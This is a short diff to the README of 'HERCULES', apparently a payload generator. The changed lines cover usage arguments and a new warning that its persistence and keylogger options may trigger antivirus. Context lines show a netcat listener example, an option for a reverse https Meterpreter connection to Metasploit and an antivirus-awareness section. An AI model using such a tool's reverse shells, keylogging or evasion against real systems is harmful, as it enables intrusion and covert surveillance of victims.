@@ -17,7 +17,7 @@ Example : nc -l -p 1234
                                                    
 
 
-Usage : ./HERCULES (LocalIp) (LocalPort) (Options)
+Usage : ./HERCULES (Ip) (Port) (Options)
 
 
 Options : 
@@ -56,9 +56,10 @@ Options :
 
 - ~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit
 
-# NOTE
+# NOTE !
 
 - Dynamic linking makes payload size smaller !
+- Using persistence and keylogger may atract anti virus softwares !
 
 # AV AWARENESS
 
